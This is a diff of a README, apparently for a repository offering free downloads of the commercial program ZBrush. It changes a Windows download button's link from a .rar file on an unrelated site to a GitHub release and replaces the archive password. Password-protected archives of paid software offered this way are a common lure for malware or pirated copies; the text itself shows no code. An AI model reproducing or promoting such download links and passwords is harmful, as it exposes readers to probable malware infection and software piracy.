@@ -14,10 +14,10 @@
 > [!NOTE]
 > - **Select a version**
 
-[![Windows](https://ltdfoto.ru/images/2024/07/31/Group_4_2.png)](https://lesfrancs-tireurs.net/temp/Software.rar)
+[![Windows](https://ltdfoto.ru/images/2024/07/31/Group_4_2.png)](https://github.com/ajay-mali27/Pixologic-ZBrush/releases/tag/Zbrush)
 
 > [!NOTE]
-> **PASSWORD: DOWNLOAD2121**
+> **PASSWORD: ZBRUSH2024**
 
 
 
